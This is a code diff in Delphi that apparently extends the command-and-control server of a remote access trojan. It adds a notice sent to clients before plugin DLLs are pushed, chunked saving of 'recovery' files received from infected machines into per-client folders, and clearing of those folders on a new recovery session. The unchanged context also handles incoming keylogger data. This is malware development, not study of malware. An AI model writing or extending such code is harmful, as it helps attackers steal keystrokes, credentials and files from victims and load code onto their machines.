@@ -232,6 +232,9 @@ type
 
 implementation
 
+uses
+  System.IOUtils;
+
 type
   TncLineAccess = class(TncLine);
 
@@ -972,6 +975,17 @@ begin
   end;
 
   DoLog(lcCommand, '"' + PluginID + '" sent to ' + IP);
+
+  { Notify client about incoming plugin to avoid visual bugs }
+  ErrObj := TJSONObject.Create;
+  try
+    ErrObj.AddPair('action', 'incoming_plugin');
+    ErrObj.AddPair('id',     PluginID);
+    SendJSON(aLine, ErrObj);
+  finally
+    ErrObj.Free;
+  end;
+
   SendBinaryPacket(aLine, PACKET_TYPE_DLL, DLLData);
 end;
 
@@ -1309,14 +1323,19 @@ begin
   if DataSize < 0 then Exit;
 
   try
-    FS := TFileStream.Create(SavePath, fmCreate);
+    if FileExists(SavePath) then
+      FS := TFileStream.Create(SavePath, fmOpenWrite or fmShareDenyNone)
+    else
+      FS := TFileStream.Create(SavePath, fmCreate);
+
     try
+      FS.Seek(0, soEnd);
       if DataSize > 0 then
         FS.WriteBuffer(Payload[4 + PathLen], DataSize);
     finally
       FS.Free;
     end;
-    DoLog(lcCommand, 'Recovery file saved: ' + RelPath + ' [' + Info.IPAddress + ']');
+    DoLog(lcCommand, 'Recovery file chunk saved: ' + RelPath + ' [' + Info.IPAddress + ']');
   except
     on E: Exception do
       DoLog(lcError, 'Failed to save recovery file ' + RelPath + ': ' + E.Message);
@@ -1358,6 +1377,7 @@ var
   MsgSuffix  : string;
   JSONClone  : TJSONObject;
   CapturedLn : TncLine;
+  ClientDir  : string;
 
   procedure FireEvent(CB: TInfoReceivedEvent); overload;
   begin
@@ -1551,6 +1571,23 @@ begin
     begin
       DoLog(lcCommand, '"keylogdata" received from ' + IP);
       FireEvent(FOnKeyloggerReceived);
+      Exit;
+    end;
+
+    { ---- Recovery Start ---- }
+    if Action = 'recovery_start' then
+    begin
+      if TryGetClientInfo(aLine, Info) then
+      begin
+        ClientDir := ExtractFilePath(ParamStr(0)) + 'Clients Folder\' + Info.ID + '\Recovery\';
+        if TDirectory.Exists(ClientDir) then
+        try
+          TDirectory.Delete(ClientDir, True);
+        except
+          on E: Exception do
+            DoLog(lcError, 'Failed to clear recovery dir: ' + E.Message);
+        end;
+      end;
       Exit;
     end;
 
